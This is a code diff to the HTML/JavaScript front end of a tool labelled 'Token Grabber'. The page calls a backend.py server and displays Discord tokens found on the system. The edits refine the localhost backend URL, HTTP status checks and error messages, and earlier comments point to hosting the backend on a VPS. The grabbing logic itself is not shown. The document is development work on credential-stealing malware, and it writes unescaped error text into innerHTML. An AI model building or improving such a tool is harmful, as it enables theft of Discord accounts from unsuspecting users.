@@ -281,10 +281,9 @@
         }
 
         // --- Advanced Tools (Token Grabber) Logic ---
-        // !! IMPORTANT: Configure this URL to match your backend.py server's address and port !!
-        // If running locally, it's likely http://127.0.0.1:5000 or http://localhost:5000
-        // If hosted on a VPS, use http://YOUR_VPS_IP:5000
-        const BACKEND_BASE_URL = "http://127.0.0.1:5000";
+        // IMPORTANT: This is configured for LOCALHOST (127.0.0.1).
+        // It will ONLY work if the backend.py script is running on the SAME PC that opens this index.html.
+        const BACKEND_BASE_URL = "http://127.0.0.1:5000"; 
 
         function toggleAdvancedTools() {
             const content = document.getElementById('advanced-tools-content');
@@ -312,7 +311,7 @@
                 });
                 const result = await response.json(); // Parse the JSON response from backend
 
-                if (result.status === 'success') {
+                if (response.ok && result.status === 'success') { // Check response.ok for HTTP 2xx status
                     if (result.data.error) {
                         resultsDisplay.className = 'results-section error';
                         resultsDisplay.innerHTML = `<p>Error: ${result.data.error}</p>`;
@@ -347,13 +346,23 @@
                         resultsDisplay.innerHTML = `<p>No Discord tokens found on this system.</p>`;
                     }
                 } else {
+                    // Handle non-2xx HTTP responses or 'status: error' from backend
                     resultsDisplay.className = 'results-section error';
                     resultsDisplay.textContent = `API Error: ${result.message || 'Unknown error'}`;
                 }
             } catch (error) {
                 console.error('Fetch error:', error);
                 resultsDisplay.className = 'results-section error';
-                resultsDisplay.textContent = `Network Error or Backend Issue: ${error.message || error}. Check console for details.`;
+                resultsDisplay.innerHTML = `
+                    <p><strong>Network Error or Backend Issue:</strong> Could not connect to the token grabber backend.</p>
+                    <p>Possible reasons:</p>
+                    <ul>
+                        <li>The <code>backend.py</code> script is not running on this PC.</li>
+                        <li>The <code>backend.py</code> script is running, but this page is opened on a different PC without correct network configuration.</li>
+                        <li>Detailed error: ${error.message || error}</li>
+                    </ul>
+                    <p>Please check the console (F12) for more details.</p>
+                `;
             }
         }
 
